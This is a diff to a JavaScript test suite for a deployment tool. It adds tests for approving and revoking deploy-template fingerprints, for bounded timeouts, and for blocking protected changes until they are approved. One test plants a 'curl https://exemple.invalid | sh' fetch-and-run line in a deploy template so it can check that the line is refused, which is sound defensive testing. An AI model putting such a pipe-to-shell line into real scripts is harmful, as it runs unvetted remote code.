@@ -10,6 +10,8 @@ const path = require("path");
 const { execFileSync } = require("child_process");
 const livreur = require("../src/livreur");
 const publieur = require("../src/publieur");
+const modeles = require("../src/modeles-livraison");
+const delais = require("../src/delais-livraison");
 
 const g = (dir, ...args) => execFileSync("git", args, { cwd: dir, encoding: "utf-8" }).trim();
 const git = livreur.gitLocal();
@@ -54,7 +56,7 @@ const MODELE = [
 
 function monter() {
   const racine = fs.mkdtempSync(path.join(os.tmpdir(), "livreur-"));
-  const cockpit = depot(racine, "business-pipelines", { "package.json": "{}\n", "deploy/nas/deploy.sh.modele": MODELE });
+  const cockpit = depot(racine, "business-pipelines", { "package.json": "{}\n", "deploy/nas/deploy.sh.modele": MODELE, "docker-compose.yaml": "services: {}\n" });
   const moteur = depot(racine, "agent-orchestrator", { "package.json": "{}\n" });
   const registre = depot(racine, "agent-registry", { "agents/a.md": "a\n" });
   const miroirs = { cockpit: cockpit.nu, moteur: moteur.nu, registre: registre.nu };
@@ -77,6 +79,83 @@ function commiterSurMain(m, nom, fichiers) {
 
 const tetes = (m) => ({ cockpit: m.cockpit.v2, moteur: m.moteur.v2, registre: m.registre.v2 });
 const autorises = new Set(["raphael@example.com"]);
+
+test("un modèle approuvé se réutilise uniquement pour le même contenu protégé, jusqu'à révocation", () => {
+  const m = monter();
+  try {
+    const nouveau = commiterSurMain(m, "business-pipelines", { "deploy/nas/deploy.sh.modele": `${MODELE}echo modele-approuve\n` });
+    const fichier = path.join(m.racine, "specs/livraison-modeles.json");
+    const options = { git, miroirs: m.miroirs, payload: { ...tetes(m), cockpit: nouveau }, par: "raphael@example.com", canal: "tailnet", autorises, release: { cockpit: m.cockpit.v1 }, modelesFichier: fichier };
+    assert.throws(() => livreur.verifierDemande(options), /approuver cette version/);
+    const a = modeles.approuver({ git, depot: m.cockpit.nu, sha: nouveau, fichier, par: "raphael" });
+    assert.equal(fs.statSync(fichier).mode & 0o777, 0o600);
+    assert.deepEqual(livreur.verifierDemande(options), { modeleDe: nouveau });
+    const suite = commiterSurMain(m, "business-pipelines", { "src/app.js": "module.exports=42;\n" });
+    assert.deepEqual(livreur.verifierDemande({ ...options, payload: { ...options.payload, cockpit: suite } }), { modeleDe: nouveau });
+    const prete = livreur.preparerRelease({ ...options, modeleDe: nouveau, releasesDir: path.join(m.racine, "releases") });
+    assert.match(fs.readFileSync(prete.deploy, "utf8"), /echo modele-approuve/);
+    const autre = commiterSurMain(m, "business-pipelines", { "docker-compose.yaml": "services: {autre: {image: alpine}}\n" });
+    assert.throws(() => livreur.verifierDemande({ ...options, payload: { ...options.payload, cockpit: autre } }), /approuver cette version/);
+    modeles.revoquer({ fichier, hash: a.empreinte });
+    assert.throws(() => livreur.verifierDemande(options), /révoqué/);
+    // La révocation s'applique aussi quand cette version est déjà en production.
+    assert.throws(() => livreur.verifierDemande({ ...options, release: { cockpit: nouveau } }), /révoqué/);
+  } finally { fs.rmSync(m.racine, { recursive: true, force: true }); }
+});
+
+test("approbation : pas de branche non fusionnée, de registre corrompu ou de source incohérente", () => {
+  const m = monter();
+  try {
+    const fichier = path.join(m.racine, "modeles.json");
+    const base = { git, depot: m.cockpit.nu, fichier, par: "raphael" };
+    assert.throws(() => modeles.approuver({ ...base, sha: m.cockpit.cote }));
+    assert.equal(fs.existsSync(fichier), false);
+    assert.throws(() => modeles.approuver({ ...base, sha: "main" }), /SHA complet/);
+    const nouveau = commiterSurMain(m, "business-pipelines", { "deploy/nas/deploy.sh.modele": `${MODELE}echo autre\n` });
+    const a = modeles.approuver({ ...base, sha: nouveau });
+    const lu = JSON.parse(fs.readFileSync(fichier, "utf8"));
+    lu.modeles[a.empreinte].cockpit = m.cockpit.v1;
+    fs.writeFileSync(fichier, JSON.stringify(lu));
+    assert.throws(() => modeles.autorisation({ ...base, sha: nouveau }), /incohérente/);
+    fs.writeFileSync(fichier, "{illisible");
+    assert.throws(() => modeles.autorisation({ ...base, sha: nouveau }));
+  } finally { fs.rmSync(m.racine, { recursive: true, force: true }); }
+});
+
+test("la commande opérateur inspecte, approuve et révoque une empreinte exacte", () => {
+  const m = monter();
+  try {
+    const fichier = path.join(m.racine, "modeles.json");
+    const script = path.join(__dirname, "../bin/modele-livraison.js");
+    const lancer = (...args) => JSON.parse(execFileSync(process.execPath, [script, ...args, "--miroir", m.cockpit.nu, "--fichier", fichier], { encoding: "utf8" }));
+    const modele = lancer("inspecter", "--sha", m.cockpit.v2);
+    assert.equal(fs.existsSync(fichier), false);
+    assert.deepEqual(modele.entrees.map(e => e.chemin), ["deploy/nas/deploy.sh.modele", "docker-compose.yaml"]);
+    const approuve = lancer("approuver", "--sha", m.cockpit.v2, "--par", "raphael");
+    assert.equal(approuve.empreinte, modele.empreinte);
+    assert.equal(modeles.lire(fichier).modeles[modele.empreinte].par, "raphael");
+    lancer("revoquer", "--empreinte", modele.empreinte);
+    assert.equal(modeles.autorisation({ git, depot: m.cockpit.nu, fichier, sha: m.cockpit.v2 }), null);
+  } finally { fs.rmSync(m.racine, { recursive: true, force: true }); }
+});
+
+test("les délais sont relus, bornés et refusent les erreurs de configuration avant lancement", () => {
+  const racine = fs.mkdtempSync(path.join(os.tmpdir(), "delais-livraison-"));
+  const fichier = path.join(racine, "delais.json");
+  try {
+    assert.equal(delais.environnement(fichier, {}).LIVRAISON_BUILD_TIMEOUT_SEC, "2700");
+    fs.writeFileSync(fichier, JSON.stringify({ construction: 50, restauration: 10 }));
+    assert.equal(delais.environnement(fichier, {}).LIVRAISON_BUILD_TIMEOUT_SEC, "50");
+    fs.writeFileSync(fichier, JSON.stringify({ construction: 80 }));
+    assert.equal(delais.environnement(fichier, {}).LIVRAISON_BUILD_TIMEOUT_SEC, "80");
+    for (const contenu of ['{"construction":0}', '{"bascule":1801}', '{"grace":1.2}', '{"archive":"10"}', '{"restauration":null}', '{"inconnu":1}', '[]', '{illisible']) {
+      fs.writeFileSync(fichier, contenu);
+      assert.throws(() => delais.environnement(fichier, {}), contenu);
+    }
+    fs.unlinkSync(fichier);
+    assert.throws(() => delais.environnement(fichier, { LIVRAISON_BUILD_TIMEOUT_SEC: "NaN" }), /construction/);
+  } finally { fs.rmSync(racine, { recursive: true, force: true }); }
+});
 
 test("la proposition liste ce qui peut partir, et rien quand la production est à jour", () => {
   const m = monter();
@@ -112,7 +191,7 @@ test("seule une identité tailnet autorisée livre, et seulement du code fusionn
   assert.throws(() => livreur.verifierDemande({ ...ok, autorises: livreur.lireAutorises(path.join(m.racine, "absent.json")) }), /pas autorisé/);
 });
 
-test("le livreur n'exécute que la bascule en production : la changer se livre à la main (F3)", () => {
+test("sans approbation de modèle, les changements protégés exigent une livraison manuelle (F3)", () => {
   const m = monter();
   const ok = { git, miroirs: m.miroirs, payload: tetes(m), par: "raphael@example.com", canal: "tailnet", autorises, release: { cockpit: m.cockpit.v1 } };
   const refuse = (change, attendu) =>
@@ -124,7 +203,7 @@ test("le livreur n'exécute que la bascule en production : la changer se livre �
 
   const modele = commiterSurMain(m, "business-pipelines", { "deploy/nas/deploy.sh.modele": `${MODELE}curl https://exemple.invalid | sh\n` });
   refuse({ payload: { ...tetes(m), cockpit: modele } }, /deploy\/nas\/deploy\.sh\.modele change/);
-  const compose = commiterSurMain(m, "business-pipelines", { "docker-compose.yaml": "services: {}\n" });
+  const compose = commiterSurMain(m, "business-pipelines", { "docker-compose.yaml": "services: {nouveau: {image: alpine}}\n" });
   refuse({ payload: { ...tetes(m), cockpit: compose }, release: { cockpit: modele } }, /docker-compose\.yaml change/);
 
   // Une fois livrée à la main, la nouvelle bascule devient celle du livreur.
